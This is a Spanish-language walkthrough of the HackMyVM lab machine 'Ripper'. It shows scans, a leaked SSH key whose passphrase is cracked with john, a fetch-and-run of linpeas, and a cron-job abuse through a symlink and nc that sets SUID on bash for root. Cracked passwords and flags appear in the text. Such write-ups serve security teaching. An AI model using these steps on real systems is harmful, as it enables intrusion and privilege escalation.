---
icon: flag
---

# Ripper HackMyVM (Easy- Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-14 03:34 EDT
Nmap scan report for 192.168.1.175
Host is up (0.00038s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 0c:3f:13:54:6e:6e:e6:56:d2:91:eb:ad:95:36:c6:8d (RSA)
|   256 9b:e6:8e:14:39:7a:17:a3:80:88:cd:77:2e:c3:3b:1a (ECDSA)
|_  256 85:5a:05:2a:4b:c0:b2:36:ea:8a:e2:8a:b2:ef:bc:df (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:34:61:07 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.58 seconds
```

Veremos que hay un puerto `80` que contiene una pagina web, por lo que si entramos veremos lo siguiente:

```
Website in maintenance... Come back next month please.
```

No veremos gran cosa por lo que vamos a realizar un poco de `fuzzing`:

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.175/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 57]
/.html                (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
/staff_statements.txt (Status: 200) [Size: 107]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

Veremos una cosa bastante interesante que es `/staff_statements.txt`, vamos a ver que contiene:

```
The site is not yet repaired. Technicians are working on it by connecting with old ssh connection files.
```

## Escalate user jack

Por lo que vemos nos esta dando una pista de que estan utilizando una clave `PEM` antigua para conectarse por `SSH` por lo que podemos creer que la extension es `.bak` vamos a probar a meter lo siguiente:

```
URL = http://<IP>/id_rsa.bak
```

Veremos que si ha funcionado, por lo que vamos a asignarle los permisos correctos al `id_rsa`:

```shell
chmod 600 id_rsa
```

Si recordamos antes cuando encendimos la maquina vimos que daba la bienvenida a un usuario llamado `jack`:

<figure><img src="../../.gitbook/assets/image (348).png" alt=""><figcaption></figcaption></figure>

Por lo que vamos a probar a conectarnos por `SSH` de la siguiente forma:

```shell
ssh -i id_rsa jack@<IP>
```

Veremos que nos pide la clave de la `id_rsa` por lo que vamos a intentar crackearla.

### Crack id\_rsa con john

```shell
ssh2john id_rsa > hash.rsa
```

```shell
john --wordlist=<WORDLIST> hash.rsa
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bananas          (id_rsa)     
1g 0:00:00:46 DONE (2025-04-14 03:47) 0.02129g/s 20.44p/s 20.44c/s 20.44C/s whitney..sandy
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Veremos que ha funcionado, por lo que vamos a volver a conectarnos por `SSH` metiendo dicha contraseña:

### SSH

```shell
ssh -i id_rsa jack@<IP>
```

Metemos como contraseña `bananas` y veremos que estaremos dentro.

## Escalate user helder

Vamos a descargarnos el `linpeas.sh` para que nos enumere el sistema a ver que encuentra:

```shell
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
bash linpeas.sh
```

Info:

<figure><img src="../../.gitbook/assets/image (349).png" alt=""><figcaption></figcaption></figure>

Veremos que hay una contraseña de `jack` pero vamos a probarla para el usuario `helder`.

```shell
su helder
```

Metemos como contraseña `Il0V3lipt0n1c3t3a` y con esto veremos que si seremos dicho usuario, por lo que leeremos la `flag` del usuario.

> user.txt

```
5c38d7d08c687355cb0ae3b6025cbe99
```

## Escalate Privileges

Vamos a ver los procesos que se estan ejecutando en el servidor, por lo que nos vamos a descargar `pspy64` en el siguiente link:

URL = Download pspy64

```shell
wget http://<IP>/pspy64
chmod +x pspy64
./pspy64
```

Info:

```
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2025/04/14 10:04:10 CMD: UID=1001  PID=12759  | ./pspy64 
2025/04/14 10:04:10 CMD: UID=0     PID=12755  | 
2025/04/14 10:04:10 CMD: UID=1001  PID=12727  | bash 
2025/04/14 10:04:10 CMD: UID=0     PID=12726  | su helder 
2025/04/14 10:04:10 CMD: UID=0     PID=12710  | 
2025/04/14 10:04:10 CMD: UID=0     PID=871    | 
2025/04/14 10:04:10 CMD: UID=1000  PID=749    | -bash 
2025/04/14 10:04:10 CMD: UID=1000  PID=748    | sshd: jack@pts/0     
2025/04/14 10:04:10 CMD: UID=1000  PID=740    | (sd-pam) 
2025/04/14 10:04:10 CMD: UID=1000  PID=739    | /lib/systemd/systemd --user 
2025/04/14 10:04:10 CMD: UID=0     PID=736    | sshd: jack [priv]    
2025/04/14 10:04:10 CMD: UID=33    PID=611    | /usr/sbin/apache2 -k start 
2025/04/14 10:04:10 CMD: UID=0     PID=8      | 
2025/04/14 10:04:10 CMD: UID=0     PID=6      | 
2025/04/14 10:04:10 CMD: UID=0     PID=4      | 
2025/04/14 10:04:10 CMD: UID=0     PID=3      | 
2025/04/14 10:04:10 CMD: UID=0     PID=2      | 
2025/04/14 10:04:10 CMD: UID=0     PID=1      | /sbin/init 
2025/04/14 10:05:01 CMD: UID=0     PID=12766  | /usr/sbin/CRON -f 
2025/04/14 10:05:01 CMD: UID=0     PID=12767  | /usr/sbin/CRON -f 
2025/04/14 10:05:01 CMD: UID=0     PID=12768  | /bin/sh -c nc -vv -q 1 localhost 10000 > /root/.local/out && if [ "$(cat /root/.local/helder.txt)" = "$(cat /home/helder/passwd.txt)" ] ; then chmod +s "/usr/bin/$(cat /root/.local/out)" ; fi
```

Veremos que se esta realizando lo siguiente:

```
2025/04/14 10:05:01 CMD: UID=0     PID=12766  | /usr/sbin/CRON -f 
2025/04/14 10:05:01 CMD: UID=0     PID=12767  | /usr/sbin/CRON -f 
2025/04/14 10:05:01 CMD: UID=0     PID=12768  | /bin/sh -c nc -vv -q 1 localhost 10000 > /root/.local/out && if [ "$(cat /root/.local/helder.txt)" = "$(cat /home/helder/passwd.txt)" ] ; then chmod +s "/usr/bin/$(cat /root/.local/out)" ; fi
```

Vemos que esta leyendo `root` el `passwd.txt` de la carpeta de la `home` de nuestro usuario, pero como no existe y tambien vemos que hay un `halder.txt` en la carpeta de `root` vamos a crear un enlace simbolico hacia nuestra `home` de la siguiente forma:

```shell
ln -s /root/.local/helder.txt /home/helder/passwd.txt
```

Ahora si leemos `passwd.txt` veremos que no nos deja, pero tambien vemos que se esta ejecutando `nc` por el puerto `10000` mediante `root` pero tambien vemos que se esta estableciendo permisos `SUID` al `out` de la carpeta de `root` por lo que vamos a probar si podremos establecer los permisos a la `bash` enviandoselo por `nc`:

```shell
echo 'bash' | nc -lvnp 10000
```

Info:

```
listening on [any] 10000 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 44944
```

Veremos que hizo conexion, ahora vamos a ver los permisos de la `bash` a ver si ha funcionado.

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```

Veremos que ha funcionado por lo que haremos lo siguiente:

```shell
bash -p
```

Info:

```
helder@ripper:~$whoami
root
helder@ripper:~$id
uid=1001(helder) gid=1001(helder) euid=0(root) egid=0(root) groups=0(root),1001(helder)
```

Por lo que vemos ya tendremos los privilegios de `root` ahora leeremos la `flag` de `root`.

> root.txt

```
e28f578a17a5f99c0381c4b689d96f9f
```
